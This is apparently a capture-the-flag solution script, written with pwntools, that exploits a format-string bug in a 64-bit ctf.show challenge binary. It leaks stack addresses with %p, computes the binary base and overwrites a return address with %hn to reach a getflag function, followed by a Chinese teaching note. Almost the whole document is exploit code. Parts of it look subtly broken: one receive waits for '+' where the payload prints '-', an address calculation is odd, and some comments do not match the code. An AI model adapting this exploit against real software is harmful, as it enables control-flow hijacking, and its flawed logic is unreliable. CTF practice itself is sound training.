from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show', 28210)

# fmt函数：发送格式化字符串
# 用于与程序交互并发送payload
def fmt(payload):
    io.recvuntil(">>>")
    io.sendline('2')
    io.sendline(payload)

# 第一次调用fmt函数，泄露main的rbp地址
io.sendline('00 00 00')
fmt('%7$n-%16$p')
io.recvuntil('-')
ret_addr = int(io.recvuntil('\n')[:-1], 16) - 0x28

# 第二次调用fmt函数，泄露fmt_attack函数的返回地址
payload = '%7$n-%17$p'
fmt(payload)
io.recvuntil('+')
ret_value = int(io.recvuntil('\n')[:-1], 16)

# 计算elf_base和ret_addr
elf_base = ret_value - 0x102c
ret_addr = elf_base + 0xff56 & 0xffff

# 构造payload，修改返回地址
payload1 = b'%8$' + str(ret_addr).encode() + b'c%10$hn'
payload1 = payload1.ljust(0x10, b'a')
payload1 += p64(ret_addr)

# 第三次调用fmt函数，修改返回地址
fmt(payload1)

log.success("ret value: "+hex(ret_value))
log.success("ret_addr: "+hex(ret_addr))

io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 64位格式化字符串漏洞利用
2. 核心原理：
   - 利用格式化字符串漏洞修改函数返回地址
   - 通过多次调用fmt_attack函数，逐步泄露和修改内存
3. 关键步骤：
   - 第一次调用：泄露main的rbp地址
   - 第二次调用：泄露fmt_attack函数的返回地址
   - 计算elf_base和ret_addr
   - 第三次调用：修改返回地址为getflag函数的地址
4. 执行流程：
   - 泄露地址 -> 计算基址 -> 构造payload -> 修改返回地址 -> 执行getflag
5. 技术要点：
   - 64位程序的格式化字符串漏洞利用
   - %n格式化符的使用（将已输出的字符数写入指定地址）
   - %hn格式化符的使用（写入2字节数据）
   - 栈布局和地址计算
"""
